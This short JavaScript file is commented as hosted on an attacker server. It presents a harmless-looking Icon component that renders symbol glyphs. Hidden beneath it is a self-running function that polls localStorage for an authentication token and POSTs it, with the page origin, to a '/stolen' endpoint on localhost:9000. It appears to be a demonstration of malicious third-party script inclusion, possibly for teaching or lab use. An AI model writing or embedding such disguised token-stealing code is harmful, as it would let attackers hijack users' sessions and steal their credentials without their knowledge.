// icons.js — hosted on attacker server

// Legit-looking Icon component
function Icon({ name = 'star', size = 24, color = '#333' }) {
  const icons = {
    star: '★',
    heart: '♥',
    check: '✔',
    alert: '⚠',
  };

  const symbol = icons[name] || '❔';

  const span = document.createElement('span');
  span.textContent = symbol;
  span.style.fontSize = size + 'px';
  span.style.color = color;
  span.style.margin = '0 4px';

  return span;
}


window.Icon = Icon;

// Getting the token authentication and sending it to the attacker's server
(function stealToken() {
  const token = localStorage.getItem('token');
  if (!token) {
    setTimeout(stealToken, 1000); // Try again in 1s
    return;
  }

  fetch('http://localhost:9000/stolen', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      source: location.origin,
      token,
    }),
  }).catch(console.error);
})();